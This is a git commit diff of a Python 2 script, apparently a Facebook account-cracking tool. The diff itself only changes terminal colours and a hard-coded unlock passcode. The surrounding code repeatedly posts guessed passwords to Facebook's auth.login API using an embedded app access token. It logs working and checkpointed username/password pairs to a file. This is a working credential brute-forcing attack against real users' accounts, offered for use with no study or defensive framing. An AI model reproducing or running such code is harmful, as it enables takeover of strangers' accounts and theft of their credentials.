3160f9694a1adedf1e7eeb7948a8435e63f29c0a
Biki Vau <92915057+BikiCyber404@users.noreply.github.com>
2021-10-21 16:05:53 +0600

    Biki-Vau.py

--- Biki-Vau.py
+++ Biki-Vau.py
@@ -104,7 +104,7 @@ print 25* '\033[1;96m-'
 print'                                        '
 
 CorrectUsername = "BIKI"
-CorrectPasscode = "OYON"
+CorrectPasscode = "HACKER"
 
 loop = 'true'
 while (loop == 'true'):
@@ -488,14 +488,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;93m[\x1b[1;92mBIKI-OK\x1b[1;91m]  ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;92m[\x1b[1;91mBIKI-OK\x1b[1;93m]  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('Biki/Mahamood-CP-OK.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;93m[\x1b[1;96mBIKI-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;93m[\x1b[1;91mBIKI-CP\x1b[1;93m]\x1b[1;93m ' + k + c + user + '  |  ' + pass1
                     cps = open('Biki/Mahamood-CP-OK.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -505,14 +505,14 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;93m[\x1b[1;92mBIKI-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass2
+                        print '\x1b[1;91m[\x1b[1;93mBIKI-OK\x1b[1;93m]  ' + k + c + user +  '  |  ' + pass2
                         okb = open('Biki/Mahamood-CP-OK.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;93m[\x1b[1;96mBIKI-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;93m[\x1b[1;91mBIKI-CP\x1b[1;93m]\x1b[1;93m ' + k + c + user + '  |  ' + pass2
                             cps = open('Biki/Mahamood-CP-OK.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
@@ -522,14 +522,14 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;93m[\x1b[1;92mBIKI-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass3
+                        print '\x1b[1;91m[\x1b[1;93mBIKI-OK\x1b[1;93m]  ' + k + c + user +  '  |  ' + pass3
                         okb = open('Biki/Mahamood-CP-OK.txt', 'a')
                         okb.write(k+c+user+pass3+'\n')
                         okb.close()
                         oks.append(c+user+pass3)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;93m[\x1b[1;96mBIKI-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass3
+                            print '\033[1;93m[\x1b[1;91mBIKI-CP\x1b[1;93m]\x1b[1;93m ' + k + c + user + '  |  ' + pass3
                             cps = open('Biki/Mahamood-CP-OK.txt', 'a')
                             cps.write(k+c+user+pass3+'\n')
                             cps.close()
